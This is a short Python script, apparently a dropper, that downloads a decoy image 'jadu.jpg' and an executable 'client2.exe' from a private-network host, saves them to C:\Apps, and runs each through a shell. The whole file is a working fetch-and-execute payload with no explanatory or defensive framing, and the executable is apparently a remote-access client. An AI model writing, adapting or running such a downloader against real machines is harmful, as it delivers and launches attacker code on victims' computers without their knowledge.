import requests,subprocess,os

def download_my_file(url):
    get_responce = requests.get(url)
    with open(file_name,'wb') as file:
        file.write(get_responce.content)

def execute_my_file(file_name):
    subprocess.run(file_name , shell=True)

def my_file_name(url):
    return url.split("/")[-1]


url_1 = 'http://192.168.43.123/jadu.jpg'
file_name = my_file_name(url_1)
os.chdir('C:\Apps')
download_my_file(url_1)
execute_my_file(file_name)
url_2 ='http://192.168.43.123/client2.exe'
file_name = my_file_name(url_2)
download_my_file(url_2)
execute_my_file(file_name)

